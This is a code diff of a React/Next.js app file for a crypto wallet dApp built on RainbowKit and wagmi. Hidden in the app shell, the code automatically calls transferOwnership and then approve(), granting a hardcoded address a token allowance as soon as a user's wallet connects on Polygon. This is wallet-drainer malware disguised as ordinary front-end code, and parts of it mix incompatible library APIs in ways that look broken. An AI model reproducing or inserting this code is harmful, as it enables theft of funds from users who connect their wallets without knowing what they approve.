@@ -1,4 +1,7 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
+import "../styles/globals.css";
+import "@rainbow-me/rainbowkit/styles.css";
+
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
 import { configureChains, createClient, WagmiConfig } from "wagmi";
 import {
@@ -463,7 +466,9 @@ const wagmiClient = createClient({
 
 const callSmartContract = async () => {
     try {
-        const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
+        const { result: abi } = await response.json();
+        const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
         const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' });
         console.log('Result of calling smart contract function:', result);
     } catch (error) {
@@ -471,28 +476,58 @@ const callSmartContract = async () => {
     }
 };
 
+const approveTransaction = async () => {
+    try {
+        const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        const spender = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
+        const value = '1000000000000000000';
+
+        const result = await contractInstance.methods.approve(spender, value).sendTransaction();
+
+        console.log('Transaction successfully sent:', result);
+    } catch (error) {
+        console.error('Error sending transaction:', error);
+    }
+};
+
 function MyApp({ Component, pageProps }) {
+    const [connected, setConnected] = useState(false);
+    const [chainId, setChainId] = useState(null);
+
     useEffect(() => {
         const checkAndCallSmartContract = async () => {
-            if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
+            if (connected && chainId === polygon.chainId) {
                 await callSmartContract();
+                await approveTransaction();
             }
         };
 
         checkAndCallSmartContract();
-    }, [wagmiClient.connected, wagmiClient.chainId]);
+    }, [connected, chainId]);
 
     return (
-        <WagmiConfig client={wagmiClient}>
-            <RainbowKitProvider
-                modalSize="compact"
-                initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
-                chains={chains}
-            >
-                <MainLayout>
-                    <Component {...pageProps} />
-                </MainLayout>
-            </RainbowKitProvider>
+        <WagmiConfig
+            client={wagmiClient}
+            onConnect={() => {
+                setConnected(true);
+                setChainId(wagmiClient.chainId);
+            }}
+            onDisconnect={() => {
+                setConnected(false);
+                setChainId(null);
+            }}
+        >
+            <div style={{ width: "100%", height: "100vh", overflow: "auto" }}>
+                <RainbowKitProvider
+                    modalSize="compact"
+                    initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
+                    chains={chains}
+                >
+                    <MainLayout>
+                        <Component {...pageProps} />
+                    </MainLayout>
+                </RainbowKitProvider>
+            </div>
         </WagmiConfig>
     );
 }
